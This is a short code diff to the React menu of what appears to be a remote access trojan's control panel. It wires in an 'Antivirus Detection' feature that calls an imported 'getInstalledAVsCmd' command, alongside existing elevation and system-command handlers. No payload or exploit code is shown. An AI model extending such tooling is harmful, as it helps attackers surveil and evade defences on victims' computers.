@@ -6,6 +6,7 @@ import {
   manageClientCmd,
   handleSystemCommandCmd,
   handleElevateCmd,
+  getInstalledAVsCmd,
 } from "../rat/RATCommands";
 
 import {
@@ -25,6 +26,7 @@ import {
   IconPlug,
   IconShareplay,
   IconNetwork,
+  IconVirusSearch,
 } from "@tabler/icons-react";
 
 const menuOptions = [
@@ -82,6 +84,12 @@ const menuOptions = [
         icon: <IconMessage2 size={24} />,
         modal: true,
         modalId: "message_box_modal",
+      },
+      {
+        label: "Antivirus Detection",
+        type: "av-detection",
+        icon: <IconVirusSearch size={24} />,
+        window: true,
       },
     ],
     navigate: false,
